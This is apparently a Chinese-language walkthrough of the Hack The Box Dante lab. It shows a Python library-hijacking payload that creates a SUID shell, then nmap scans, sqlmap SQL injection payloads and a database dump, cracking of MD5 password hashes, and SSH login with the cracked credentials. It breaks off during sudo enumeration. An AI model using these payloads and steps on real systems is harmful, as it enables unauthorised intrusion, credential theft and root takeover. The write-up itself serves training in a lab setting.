2026/01/30 21:54:02 CMD: UID=997   PID=16571  | sh -c /opt/omi/bin/omicli wql root/scx "SELECT PercentUserTime, PercentPrivilegedTime, UsedMemory, PercentUsedMemory FROM SCX_UnixProcessStatisticalInformation where Handle='1573'" | grep =                                                
2026/01/30 21:54:02 CMD: UID=0     PID=16575  | rm /home/frank/call.py                                            
2026/01/30 21:54:02 CMD: UID=0     PID=16576  | sleep 1 
2026/01/30 21:54:03 CMD: UID=0     PID=16577  | rm /home/frank/urllib.py    
```

```c
2026/01/30 21:54:01 CMD: UID=0     PID=16568  | /bin/sh -c python3 /home/frank/apache_restart.py; sleep 1; rm /home/frank/call.py; sleep 1; rm /home/frank/urllib.py       
2026/01/30 21:54:01 CMD: UID=0     PID=16569  | python3 /home/frank/apache_restart.py 
2026/01/30 21:54:02 CMD: UID=0     PID=16575  | rm /home/frank/call.py                                            
2026/01/30 21:54:02 CMD: UID=0     PID=16576  | sleep 1 
2026/01/30 21:54:03 CMD: UID=0     PID=16577  | rm /home/frank/urllib.py    
```

```c
frank@DANTE-NIX02:~$ ls -al apache_restart.py 
-r--r--r-- 1 root root 198 May 19  2020 apache_restart.py
```

由于我们没办法写入脚本，所以只能进行库劫持

先检查python库的导入顺序

```c
>>> import sys
>>> sys.path
['', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages']
```

可以发现库调用以当前目录优先

```c
import os  
os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")
```

然后，脚本被调用后，被劫持的库会创建一个启用 SUID 的 /tmp/sh 文件。我们运行它，使用 -p 选项来保留 SUID（默认情况下 SUID 会被移除）：

`/tmp/sh -p`

```c
# cd /root
# cat flag.txt 
DANTE{L0v3_m3_S0m3_H1J4CK1NG_XD}
```

# 172.16.1.12
## 端口扫描
```powershell
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# proxychains -q nmap 172.16.1.12 -sT -sV -Pn -T5
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-30 23:14 EST
Nmap scan report for 172.16.1.12
Host is up (0.21s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
443/tcp  open  ssl/http Apache httpd 2.4.43 ((Unix) OpenSSL/1.1.1g PHP/7.4.7 mod_perl/2.0.11 Perl/v5.30.3)
3306/tcp open  mysql?
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port21-TCP:V=7.94SVN%I=7%D=1/30%Time=697D8288%P=x86_64-pc-linux-gnu%r(N
SF:ULL,33,"220\x20ProFTPD\x20Server\x20\(ProFTPD\)\x20\[::ffff:172\.16\.1\
SF:.12\]\r\n")%r(GenericLines,8F,"220\x20ProFTPD\x20Server\x20\(ProFTPD\)\
SF:x20\[::ffff:172\.16\.1\.12\]\r\n500\x20Invalid\x20command:\x20try\x20be
SF:ing\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x
SF:20more\x20creative\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3306-TCP:V=7.94SVN%I=7%D=1/30%Time=697D8282%P=x86_64-pc-linux-gnu%r
SF:(NULL,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20a
SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GenericL
SF:ines,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GetReques
SF:t,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(HTTPOptions,
SF:4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed
SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RTSPRequest,4B
SF:,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RPCCheck,4B,"G\0
SF:\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20to\
SF:x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSVersionBindReqTCP,
SF:4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed
SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSStatusReque
SF:stTCP,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20a
SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Help,4B,
SF:"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x2
SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SSLSessionReq,4B,
SF:"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x2
SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TerminalServerCoo
SF:kie,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TLSSession
SF:Req,4B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Kerberos,4
SF:B,"G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\
SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SMBProgNeg,4B,"
SF:G\0\0\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20
SF:to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(X11Probe,4B,"G\0\0
SF:\x01\xffj\x04Host\x20'172\.16\.1\.100'\x20is\x20not\x20allowed\x20to\x2
SF:0connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 266.58 seconds

```

### 攻击面
#### 🔴 21 / FTP — ProFTPD（非常值得打）
```plain
220 ProFTPD Server (ProFTPD)
```

这是重点原因：

+ ProFTPD **历史洞很多**
+ 经常配合：
    - 匿名登录
    - 弱口令
    - `mod_copy`（CVE-2015-3306）
+ 很容易 **写 WebShell 到 Web 目录**

👉 **优先级：高**

---

#### 🔴 80 / 443 — Apache + PHP 7.4.7（主战场）
```plain
Apache/2.4.43
PHP/7.4.7
mod_perl
```

典型攻击面：

+ CMS（WordPress / Joomla / 自研）
+ LFI / RFI
+ 文件上传
+ PHP 反序列化
+ 管理后台
+ 和 FTP / MySQL 联动

👉 **优先级：最高**

---

#### 🟡 3306 / MySQL（信息泄露型）
```plain
Host '172.16.1.100' is not allowed to connect
```

这说明：

+ MySQL **不允许远程**
+ 但：
    - 用户名可能是 `root / web / wordpress`
    - 密码经常复用
    - 一旦 Web 拿到 config，MySQL = 横向 + 提权

👉 **不是第一步，但一定会用到**

---

#### 🟢 22 / SSH
```plain
OpenSSH 7.6p1 Ubuntu
```

+ 版本不老
+ **不打 0day**
+ 等拿到 creds 再进

## 80端口
![](/image/prolabs/Dante-14.png)

### 子域名扫描
```c
proxychains -q wfuzz -c -z file,/home/kali/Desktop/wordlists/seclists/Discovery/Web-Content/common.txt --hc 404 http://172.16.1.12/FUZZ
-z file,common.txt      # 用字典替换 FUZZ
--hc 404                # hide code 404（隐藏不存在的）
-c                      # 彩色输出
http://IP/FUZZ          # 目录枚举
```

```c
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q wfuzz -c -z file,/home/kali/Desktop/wordlists/seclists/Discovery/Web-Content/common.txt --hc 404,403 http://172.16.1.12/FUZZ

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.16.1.12/FUZZ
Total requests: 4750

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                           
=====================================================================

000000880:   301        7 L      20 W       232 Ch      "blog"                                            
000001374:   301        7 L      20 W       237 Ch      "dashboard"                                       
000001772:   200        5 L      1546 W     30891 Ch    "favicon.ico"                                     
000002210:   302        0 L      0 W        0 Ch        "index.php"                                       
000002188:   301        7 L      20 W       231 Ch      "img"                                             
000004497:   301        7 L      20 W       237 Ch      "webalizer"                                       

Total time: 127.9179
Processed Requests: 4750
Filtered Requests: 4744
Requests/sec.: 37.13318

```

![](/image/prolabs/Dante-15.png)

该博客名为“ Responsive Blog  ”，该软件中存在 SQL 注入漏洞（ [https://www.exploit-db.com/exploits/48615](https://www.exploit-db.com/exploits/48615) ）。

我们手动检查 SQL 注入漏洞是否存在于此： [http://172.16.1.12/blog/category.php?id](http://172.16.1.12/blog/category.php?id=2%27) =2%27

![](/image/prolabs/Dante-16.png)

```plain
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''2''' at line 1
```

很好，确认无误！我们运行了 SQLmap：

```c
proxychains -q sqlmap -u 'http://172.16.1.12/blog/category.php?id=2' --dbs --batch
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# proxychains -q sqlmap -u 'http://172.16.1.12/blog/category.php?id=2' --dbs --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.10.1.47#dev}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:06:50 /2026-01-31/

[04:06:50] [INFO] testing connection to the target URL
[04:06:51] [INFO] checking if the target is protected by some kind of WAF/IPS
[04:06:51] [INFO] testing if the target URL content is stable
[04:06:52] [INFO] target URL content is stable
[04:06:52] [INFO] testing if GET parameter 'id' is dynamic
[04:06:52] [INFO] GET parameter 'id' appears to be dynamic
[04:06:52] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[04:06:53] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[04:06:53] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[04:06:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                            
[04:06:55] [WARNING] reflective value(s) found and filtering out
[04:06:57] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="tips")
[04:06:57] [INFO] testing 'Generic inline queries'
[04:06:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                     
[04:06:58] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'      
[04:06:58] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                                 
[04:06:58] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'                  
[04:06:59] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'                                         
[04:06:59] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'          
[04:07:00] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                         
[04:07:00] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'          
[04:07:00] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                               
[04:07:01] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable                      
[04:07:01] [INFO] testing 'MySQL inline queries'
[04:07:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'                                   
[04:07:01] [WARNING] time-based comparison requires larger statistical model, please wait..... (done)
[04:07:03] [INFO] testing 'MySQL >= 5.0.12 stacked queries'                                             
[04:07:04] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'                     
[04:07:04] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'                               
[04:07:05] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'                        
[04:07:05] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'                                  
[04:07:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'                          
[04:07:17] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:07:17] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'                                
[04:07:17] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:07:17] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:07:20] [INFO] target URL appears to have 2 columns in query
[04:07:22] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable       
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2' AND 1451=1451 AND 'tpiP'='tpiP

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=2' AND (SELECT 9520 FROM(SELECT COUNT(*),CONCAT(0x7176707071,(SELECT (ELT(9520=9520,1))),0x716b707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'nNTF'='nNTF

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=2' AND (SELECT 9379 FROM (SELECT(SLEEP(5)))OHPo) AND 'QFkU'='QFkU

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=-3255' UNION ALL SELECT NULL,CONCAT(0x7176707071,0x7061546a4b6a43417a7556577870614f4e73464d6d5149594569526347516d4c77797145666a4f6b,0x716b707871)-- -
---
[04:07:22] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.43, PHP 7.4.7
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[04:07:22] [INFO] fetching database names
[04:07:23] [INFO] retrieved: 'information_schema'
[04:07:24] [INFO] retrieved: 'test'
[04:07:24] [INFO] retrieved: 'performance_schema'
[04:07:25] [INFO] retrieved: 'flag'
[04:07:25] [INFO] retrieved: 'mysql'
[04:07:25] [INFO] retrieved: 'blog_admin_db'
[04:07:26] [INFO] retrieved: 'phpmyadmin'
available databases [7]:                           
[*] blog_admin_db
[*] flag
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test

[04:07:26] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.16.1.12'

[*] ending @ 04:07:26 /2026-01-31/
```

让我们使用选项 `-D flag --dump` 转储数据库“flag”。

```c
+------------------------------+
| flag                         |
+------------------------------+
| DANTE{wHy_y0U_n0_s3cURe?!?!} |
+------------------------------+

```

我们将导出博客数据，使用命令 `-D blog_admin_db --tables`

```c
Database: blog_admin_db
[13 tables]
+-----------------------------+
| banner_posts                |
| blog_categories             |
| blogs                       |
| editors_choice              |
| links                       |
| membership_grouppermissions |
| membership_groups           |
| membership_userpermissions  |
| membership_userrecords      |
| membership_users            |
| page_hits                   |
| titles                      |
| visitor_info                |
+-----------------------------+
```

然后，我们导出用户表： `-D blog_admin_db -T membership_users --dump`

```c
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q sqlmap -u 'http://172.16.1.12/blog/category.php?id=2' -D blog_admin_db -T membership_users --dump

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.10.1.47#dev}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:18:28 /2026-01-31/

[04:18:28] [INFO] resuming back-end DBMS 'mysql' 
[04:18:28] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2' AND 1451=1451 AND 'tpiP'='tpiP

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=2' AND (SELECT 9520 FROM(SELECT COUNT(*),CONCAT(0x7176707071,(SELECT (ELT(9520=9520,1))),0x716b707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'nNTF'='nNTF

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=2' AND (SELECT 9379 FROM (SELECT(SLEEP(5)))OHPo) AND 'QFkU'='QFkU

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=-3255' UNION ALL SELECT NULL,CONCAT(0x7176707071,0x7061546a4b6a43417a7556577870614f4e73464d6d5149594569526347516d4c77797145666a4f6b,0x716b707871)-- -
---
[04:18:29] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.7, Apache 2.4.43
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[04:18:29] [INFO] fetching columns for table 'membership_users' in database 'blog_admin_db'
[04:18:29] [INFO] resumed: 'memberID','varchar(20)'
[04:18:29] [INFO] resumed: 'passMD5','varchar(40)'
[04:18:29] [INFO] resumed: 'email','varchar(100)'
[04:18:29] [INFO] resumed: 'signupDate','date'
[04:18:29] [INFO] resumed: 'groupID','int(10) unsigned'
[04:18:29] [INFO] resumed: 'isBanned','tinyint(4)'
[04:18:29] [INFO] resumed: 'isApproved','tinyint(4)'
[04:18:29] [INFO] resumed: 'custom1','text'
[04:18:29] [INFO] resumed: 'custom2','text'
[04:18:29] [INFO] resumed: 'custom3','text'
[04:18:29] [INFO] resumed: 'custom4','text'
[04:18:29] [INFO] resumed: 'comments','text'
[04:18:29] [INFO] resumed: 'pass_reset_key','varchar(100)'
[04:18:29] [INFO] resumed: 'pass_reset_expiry','int(10) unsigned'
[04:18:29] [INFO] fetching entries for table 'membership_users' in database 'blog_admin_db'                       
[04:18:29] [INFO] resumed: 'Admin member created automatically on 2018-04-26\nRecord updated automatically on 20...
[04:18:29] [INFO] resumed: ' ',' ',' ',' ',' ','ben@dante.htb',' ',' ',' ','ben','442179ad1de9c25593cabf625c0bad...
[04:18:29] [INFO] resumed: 'member signed up through the registration form.','egre55','a','a','a','egre55@htb.co...
[04:18:29] [INFO] resumed: 'Anonymous member created automatically on 2018-04-26',' ',' ',' ',' ',' ','1','1','0...
[04:18:29] [INFO] recognized possible password hashes in column 'passMD5'                                         
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[04:18:31] [INFO] writing hashes to a temporary file '/tmp/sqlmaph5j9kzos161181/sqlmaphashes-0omlqbzz.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[04:18:32] [INFO] using hash method 'md5_generic_passwd'
[04:18:32] [INFO] resuming password 'admin' for hash '21232f297a57a5a743894a0e4a801fc3'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> y
[04:18:33] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] y
[04:18:35] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[04:18:35] [INFO] starting 4 processes 
[04:18:43] [INFO] using suffix '1'                                                                                
[04:18:52] [INFO] using suffix '123'                                                                              
[04:19:00] [INFO] using suffix '2'                                                                                
[04:19:08] [INFO] using suffix '12'                                                                               
[04:19:16] [INFO] using suffix '3'                                                                                
[04:19:24] [INFO] using suffix '13'                                                                               
[04:19:32] [INFO] using suffix '7'                                                                                
[04:19:40] [INFO] using suffix '11'                                                                               
[04:19:48] [INFO] using suffix '5'                                                                                
[04:19:57] [INFO] using suffix '22'                                                                               
[04:20:05] [INFO] using suffix '23'                                                                               
[04:20:13] [INFO] using suffix '01'                                                                               
[04:20:22] [INFO] using suffix '4'                                                                                
[04:20:30] [INFO] using suffix '07'                                                                               
[04:20:38] [INFO] using suffix '21'                                                                               
[04:20:46] [INFO] using suffix '14'                                                                               
[04:20:54] [INFO] using suffix '10'                                                                               
[04:21:02] [INFO] using suffix '06'                                                                               
[04:21:10] [INFO] using suffix '08'                                                                               
[04:21:19] [INFO] using suffix '8'                                                                                
[04:21:27] [INFO] using suffix '15'                                                                               
[04:21:35] [INFO] using suffix '69'                                                                               
[04:21:43] [INFO] using suffix '16'                                                                               
[04:21:51] [INFO] using suffix '6'                                                                                
[04:22:00] [INFO] using suffix '18'                                                                               
[04:22:08] [INFO] using suffix '!'                                                                                
[04:22:16] [INFO] using suffix '.'                                                                                
[04:22:24] [INFO] using suffix '*'                                                                                
[04:22:33] [INFO] using suffix '!!'                                                                               
[04:22:41] [INFO] using suffix '?'                                                                                
[04:22:49] [INFO] using suffix ';'                                                                                
[04:22:58] [INFO] using suffix '..'                                                                               
[04:23:06] [INFO] using suffix '!!!'                                                                              
[04:23:15] [INFO] using suffix ','                                                                                
[04:23:23] [INFO] using suffix '@'                                                                                
Database: blog_admin_db                                                                                           
Table: membership_users
[4 entries]
+---------+----------+----------------+---------+---------+---------+---------+------------------------------------------+----------------------------------------------------------------------------------------------+----------+------------+------------+----------------+-------------------+
| groupID | memberID | email          | custom1 | custom2 | custom3 | custom4 | passMD5                                  | comments                                                                                     | isBanned | isApproved | signupDate | pass_reset_key | pass_reset_expiry |
+---------+----------+----------------+---------+---------+---------+---------+------------------------------------------+----------------------------------------------------------------------------------------------+----------+------------+------------+----------------+-------------------+
| 2       | admin    | <blank>        | NULL    | NULL    | NULL    | NULL    | 21232f297a57a5a743894a0e4a801fc3 (admin) | Admin member created automatically on 2018-04-26\nRecord updated automatically on 2018-04-27 | 0        | 1          | 2018-04-26 | NULL           | NULL              |
| NULL    | ben      | ben@dante.htb  | NULL    | NULL    | NULL    | NULL    | 442179ad1de9c25593cabf625c0badb7         | NULL                                                                                         | NULL     | NULL       | NULL       | NULL           | NULL              |
| 3       | egre55   | egre55@htb.com | egre55  | a       | a       | a       | d6501933a2e0ea1f497b87473051417f         | member signed up through the registration form.                                              | 0        | 1          | 2020-08-05 | NULL           | NULL              |
| 1       | guest    | NULL           | NULL    | NULL    | NULL    | NULL    | NULL                                     | Anonymous member created automatically on 2018-04-26                                         | 0        | 1          | 2018-04-26 | NULL           | NULL              |
+---------+----------+----------------+---------+---------+---------+---------+------------------------------------------+----------------------------------------------------------------------------------------------+----------+------------+------------+----------------+-------------------+

[04:23:32] [INFO] table 'blog_admin_db.membership_users' dumped to CSV file '/root/.local/share/sqlmap/output/172.16.1.12/dump/blog_admin_db/membership_users.csv'                                                                    
[04:23:32] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.16.1.12'

[*] ending @ 04:23:32 /2026-01-31/

```

我们找到以下 MD5 哈希值：

```c
21232f297a57a5a743894a0e4a801fc3
442179ad1de9c25593cabf625c0badb7
d6501933a2e0ea1f497b87473051417f
```

我们用 JohnTheRipper 破解这些哈希值：

```c
 john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
```

We found the passwords:  我们找到了密码：

```plain
admin
Welcometomyblog
```

## ssh连接
admin无法登录，尝试ben用户

ben/Welcometomyblog

```c
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains ssh ben@172.16.1.12
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1234  ...  172.16.1.12:22  ...  OK
The authenticity of host '172.16.1.12 (172.16.1.12)' can't be established.
ED25519 key fingerprint is SHA256:XeJgnh2gzqE2SPuygySuBLdxtTzyNCnaz8BQ9D0mC0U.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.16.1.12' (ED25519) to the list of known hosts.
ben@172.16.1.12's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.4.0-48-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

270 packages can be updated.
146 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Tue Dec  8 05:17:48 2020 from 10.100.1.2
ben@DANTE-NIX04:~$ 
```

```c
ben@DANTE-NIX04:~$ cat flag.txt
DANTE{Pretty_Horrific_PH4IL!}
```

## 提权
```c
ben@DANTE-NIX04:~$ find / -perm -4000 2>/dev/null
/opt/lampp/bin/suexec
/usr/local/bin/sudo
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/pkexec
/usr/bin/arping
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/vmware-user-suid-wrapper
/usr/bin/chsh
/usr/sbin/pppd
/snap/core/9993/bin/mount
/snap/core/9993/bin/ping
/snap/core/9993/bin/ping6
/snap/core/9993/bin/su
/snap/core/9993/bin/umount
/snap/core/9993/usr/bin/chfn
/snap/core/9993/usr/bin/chsh
/snap/core/9993/usr/bin/gpasswd
/snap/core/9993/usr/bin/newgrp
/snap/core/9993/usr/bin/passwd
/snap/core/9993/usr/bin/sudo
/snap/core/9993/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9993/usr/lib/openssh/ssh-keysign
/snap/core/9993/usr/lib/snapd/snap-confine
/snap/core/9993/usr/sbin/pppd
/snap/core/9804/bin/mount
/snap/core/9804/bin/ping
/snap/core/9804/bin/ping6
/snap/core/9804/bin/su
/snap/core/9804/bin/umount
/snap/core/9804/usr/bin/chfn
/snap/core/9804/usr/bin/chsh
/snap/core/9804/usr/bin/gpasswd
/snap/core/9804/usr/bin/newgrp
/snap/core/9804/usr/bin/passwd
/snap/core/9804/usr/bin/sudo
/snap/core/9804/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9804/usr/lib/openssh/ssh-keysign
/snap/core/9804/usr/lib/snapd/snap-confine
/snap/core/9804/usr/sbin/pppd
/snap/core18/1880/bin/mount
/snap/core18/1880/bin/ping
/snap/core18/1880/bin/su
/snap/core18/1880/bin/umount
/snap/core18/1880/usr/bin/chfn
/snap/core18/1880/usr/bin/chsh
/snap/core18/1880/usr/bin/gpasswd
/snap/core18/1880/usr/bin/newgrp
/snap/core18/1880/usr/bin/passwd
/snap/core18/1880/usr/bin/sudo
/snap/core18/1880/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1880/usr/lib/openssh/ssh-keysign
/snap/core18/1885/bin/mount
/snap/core18/1885/bin/ping
/snap/core18/1885/bin/su
/snap/core18/1885/bin/umount
/snap/core18/1885/usr/bin/chfn
/snap/core18/1885/usr/bin/chsh
/snap/core18/1885/usr/bin/gpasswd
/snap/core18/1885/usr/bin/newgrp
/snap/core18/1885/usr/bin/passwd
/snap/core18/1885/usr/bin/sudo
/snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1885/usr/lib/openssh/ssh-keysign
/bin/su
/bin/ping
/bin/fusermount
/bin/umount
/bin/mount
```

```c
ben@DANTE-NIX04:/opt/lampp/bin$ sudo -l
Password: 
Matching Defaults entries for ben on DANTE-NIX04:
